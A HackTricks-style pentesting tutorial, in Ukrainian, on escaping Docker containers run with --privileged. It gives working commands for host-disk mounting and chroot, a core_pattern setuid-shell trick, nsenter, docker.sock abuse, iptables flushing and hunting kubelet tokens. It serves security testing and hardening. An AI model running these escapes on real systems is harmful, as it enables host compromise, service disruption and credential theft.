# Вихід із `--privileged` контейнерів

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Контейнер, запущений із `--privileged`, — це не те саме, що звичайний контейнер з одним чи двома додатковими дозволами. На практиці `--privileged` усуває або послаблює кілька стандартних runtime-захистів, які зазвичай не дозволяють workload взаємодіяти з небезпечними ресурсами хоста. Точний ефект залежить від runtime та хоста, але для Docker зазвичай результат такий:

- надаються всі capabilities
- обмеження device cgroup скасовуються
- багато kernel-файлових систем більше не монтуються лише для читання
- стандартні замасковані шляхи procfs стають доступними
- seccomp-фільтрація вимикається
- ізоляція AppArmor вимикається
- ізоляція SELinux вимикається або замінюється значно ширшою міткою

Важливий наслідок полягає в тому, що privileged container зазвичай **не** потребує складного kernel exploit. У багатьох випадках він може просто взаємодіяти з пристроями хоста, kernel-файловими системами, доступними з хоста, або runtime-інтерфейсами, а потім виконати pivot до shell хоста.

## Що `--privileged` НЕ змінює автоматично

`--privileged` **не** приєднує автоматично контейнер до PID, network, IPC або UTS namespace хоста. Privileged container усе ще може мати власні namespace. Це означає, що для деяких escape chain потрібна додаткова умова, наприклад:

- bind mount хоста
- спільний PID хоста
- networking хоста
- доступні пристрої хоста
- доступні для запису інтерфейси proc/sys

У реальних misconfiguration ці умови часто легко виконати, але концептуально вони є окремими від самого `--privileged`.

## Шляхи escape

### 1. Монтування диска хоста через доступні пристрої

Privileged container зазвичай бачить значно більше device nodes у `/dev`. Якщо block device хоста доступний, найпростіший escape — змонтувати його та виконати `chroot` у файлову систему хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Якщо кореневий розділ не є очевидним, спочатку перелічіть структуру блоків:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Якщо практичний шлях полягає в розміщенні setuid-помічника у доступному для запису монтуванні хоста, а не у використанні `chroot`, пам’ятайте, що не кожна файлова система підтримує біт setuid. Швидка перевірка можливостей на стороні хоста:
```bash
mount | grep -v "nosuid"
```
Це корисно, оскільки доступні для запису шляхи у файлових системах `nosuid` значно менш цікаві для класичних сценаріїв на кшталт «розмістити setuid shell і виконати його пізніше».

Послаблені механізми захисту, які тут використовуються:

- повний доступ до пристроїв
- широкі capabilities, особливо `CAP_SYS_ADMIN`

Пов’язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Підключення або повторне використання bind mount хоста та `chroot`

Якщо коренева файлова система хоста вже підключена всередині контейнера або контейнер може створювати необхідні mount-и, оскільки він privileged, доступ до shell хоста часто можна отримати лише за допомогою `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Якщо bind mount кореневого каталогу хоста відсутній, але сховище хоста доступне, створіть його:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Цей шлях використовує:

- послаблені обмеження монтування
- повні capabilities
- відсутність MAC-ізоляції

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Використання доступного для запису `/proc/sys` або `/sys`

Одним із важливих наслідків `--privileged` є значне послаблення захисту procfs і sysfs. Це може відкрити інтерфейси ядра, орієнтовані на host, які зазвичай маскуються або монтуються лише для читання.

Класичним прикладом є `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Серед інших важливих шляхів:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Цей шлях зловживає:

- відсутніми masked paths
- відсутніми read-only system paths

Пов’язані сторінки:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Використання повного набору capabilities для mount- або namespace-based escape

Privileged container отримує capabilities, які зазвичай видаляються зі стандартних контейнерів, зокрема `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` та багато інших. Цього часто достатньо, щоб перетворити локальний foothold на host escape, щойно з’являється інша доступна поверхня атаки.

Простий приклад — монтування додаткових файлових систем і використання входу до namespace:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Якщо PID хоста також спільний, крок стає ще коротшим:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Цей шлях використовує:

- стандартний набір privileged capabilities
- необов’язковий спільний доступ до host PID

Пов’язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Втеча через Runtime Sockets

Privileged container часто отримує доступ до стану або sockets host runtime. Якщо socket Docker, containerd або CRI-O доступний, найпростішим підходом часто є використання API runtime для запуску другого container з доступом до host:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Для containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Цей шлях зловживає:

- exposure привілейованого runtime
- host bind mounts, створеними безпосередньо через runtime

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Усунення побічних ефектів ізоляції мережі

`--privileged` сам по собі не приєднує контейнер до host network namespace, але якщо контейнер також використовує `--network=host` або інший доступ до host network, увесь мережевий стек стає доступним для змін:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це не завжди забезпечує прямий доступ до host shell, але може призвести до denial of service, перехоплення трафіку або доступу до management-сервісів, доступних лише через loopback.

Пов’язані сторінки:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Читання секретів host і стану runtime

Навіть коли clean shell escape не відбувається одразу, privileged containers часто мають достатній доступ для читання секретів host, стану kubelet, метаданих runtime та файлових систем сусідніх контейнерів:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Якщо `/var` змонтовано з host або каталоги runtime доступні, цього може бути достатньо для lateral movement або викрадення cloud/Kubernetes credentials ще до отримання shell на host.

Пов’язані сторінки:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Перевірки

Мета наведених нижче команд — підтвердити, які сімейства escape із privileged-container є безпосередньо доступними.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Що тут становить інтерес:

- повний набір capabilities, особливо `CAP_SYS_ADMIN`
- доступний для запису proc/sys
- видимі пристрої host
- відсутні seccomp і MAC-ізоляція
- runtime-сокети або bind mounts кореневої файлової системи host

Будь-якого з них може бути достатньо для post-exploitation. Кілька таких факторів разом зазвичай означають, що до компрометації host функціонально залишилася одна-дві команди.

## Пов’язані сторінки

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
